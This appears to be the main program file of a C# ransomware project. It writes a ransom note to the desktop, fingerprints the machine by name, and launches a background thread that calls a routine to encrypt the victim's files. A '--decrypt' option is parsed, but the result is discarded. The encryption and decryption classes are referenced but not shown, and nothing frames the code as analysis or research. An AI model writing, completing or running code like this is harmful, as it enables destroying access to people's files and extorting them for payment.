using System;
using System.Diagnostics;
using System.Threading;

namespace s0s_L_ckr;

internal class Program
{
	private static int Main(string[] args)
	{
		Process process = new Process();
		process.StartInfo.FileName = "powershell.exe";
		process.StartInfo.Arguments = "-c\"Start-Sleep -s 10\"";
		process.Start();
		string mess = "Ransom Note: \n \tWhat Happened to my files? \n20qUdZOQZw0iatnMEH4ZzM6ZUYiGVhlwFCEl5CaQeQkuFQ5A5vQeKaIe12gt0kosuiilepi02ch6RMrRhj3CCFmo4knVUUKH0JgnPrjFgRFcQfOxCPVp2pUFzeGPQ8HxsvO2vO7CC7CEhAqFyL2qWreHVVr9Km3yzWIWPJKTLrdS0gxuHuIY4yPqcpp8j5qUYcmfLej88qIIcuowtKXzxwR7EFH8HdhURb6GpZlXJ8kOwOKKk3d4FONdmCk2UCUjUMrGBXpkZg2q272VMqimyUp38pQDX3fGcd4o8kkz7HtcaeBJY2FhwsHduMXW19QaAwKz6eNJpzqCeulDes4EzFQ1zH4l7Vwumut5wbEaiD6WM0jqnoHczgKzjERsgB4l18olp4zC20kXlQRNCmq8ymn1AwOhibLVF6QoddbhIU9MecY8cjfIZGxfLQHWBaNoIb9ZqIrDo8X05pQqW9MbT88Zluh0OqLvyj9HevMJSJxQK1qS0TXrPk18xdwPfm2UC0WByaPQJqBolNAmuZjnVQeIGZpUt5ZcLF2hFDdaogFwrE1oOxfYErZYJNs9urUsk8S0fjqbyB3rHYu9YPKIICRR29epBexzt9FhrLbZYa1XL3b2W9wxDFrXMuFPfK3hRKVdKZWIVPvM0QxYUy8EgRQi8pwDDCqwpvfcbhYoy8MRrucNjM9CahKofVAOno4qDjubZViVt4TfJ5yACdHS6cmVrEWlCGuJrlTVGU2ga5HVuL8tpVHrj5qNT4v0TX0NhZBHh34Qvu2yu54NRv31syOhEU97JeuOWhNK4Fn1ZPc7kz0nFuZLI24XS1EHkcPOLpwHjjcow4K0C7xYJcy2ZH5BaluXNljGjz5lteew4Cc4p0cBdkozPkdYHCza0S8KtVgoBI5UNAne5ip9G4NBlDeFveW9BywC3RtPvf07jl7GhrznkimVsAj9Y2M98R0Nrx4sHEHGZhFKCvkWfyH6EPmUGPmpZbul1VDHI4DAUug3mrU4NuZVrH59M2R3fZB1keXKCGIAalLj76B51fuCCd4aZmVqNpE8bHbMRC4Rhjl7FLc8Dra8uOb3QbBYu5hMXoh2NLwhacp4NzVoIXKTqVbnSzNR0GJa4vFUhwE47Xp7eQ2jm0bVU7lLylyd1RdJA2JMgc6Dwh1jJF5CF5sQPODQOw60YzpQE1J2PtRFrrDAZYV4YZaUaAFqZBIW5jF0";
		RansomMessage ransomMessage = new RansomMessage(mess, "Recovery Instructions Here", 10);
		ransomMessage.WritMesToDes();
		if (args.Length == 0 || !(args[0] == "--decrypt"))
		{
			_ = "E";
		}
		else
			_ = "D";
		string iD = Environment.MachineName;
		CompIdStrat.StickyFingerPrinter(ref iD);
		int num = -1;
		ThreadStart threadStart = null;
		threadStart = ENCR_ALL_THE_THINGS;
		num = 0;
		if (threadStart != null)
		{
			Thread thread = new Thread(threadStart);
			thread.Priority = ThreadPriority.BelowNormal;
			thread.IsBackground = true;
			thread.Start();
			thread.Join();
		}
		return num;
	}

	private static void ENCR_ALL_THE_THINGS()
	{
		EncrStr encrStr = new EncrStr();
		encrStr.EncrDis();
	}

	private static void DECR_ALL_THE_THINGS()
	{
		DecStr decStr = new DecStr();
		decStr.DecrDis();
	}
}
